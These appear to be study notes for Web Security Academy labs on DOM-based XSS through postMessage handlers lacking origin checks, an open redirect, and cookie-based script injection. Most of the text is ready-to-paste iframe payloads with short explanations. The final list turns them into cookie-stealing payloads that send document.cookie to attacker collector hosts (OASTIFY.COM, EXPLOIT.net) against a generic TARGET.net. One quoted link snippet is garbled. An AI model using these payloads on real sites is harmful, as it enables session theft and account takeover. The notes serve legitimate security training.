-  Look for event listener in the DOM. Use payload below in exploit server body to send a message that will trigger print function call..
-    <iframe src="//lab_id.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
-  
- Look for event listener in the DOM. There is an event listener that will take user input url if there is a 'http' string. This can be included in a comment (e.g. //http) after javascript:print

                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    

<iframe src="//lab_id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

 <iframe src=https://lab_id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

When iframe loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse() before sending it to the switch.

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.

As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser.
The blog post page contains the following link, which returns to the home page of the blog:

<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>


Visit: https:/lab_id.web-security-academy.net/post?postId=4&url=https://exploit_id.exploit-server.net/


home page uses a client-side cookie called lastViewedProduct, whose value is the URL of the last product page that the user visited

<iframe src="https://lab_id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://lab_id.web-security-academy.net';window.x=1;">


The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.

**  

- <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
    
- <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
    
- <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
    
- https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
    
- <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
    

**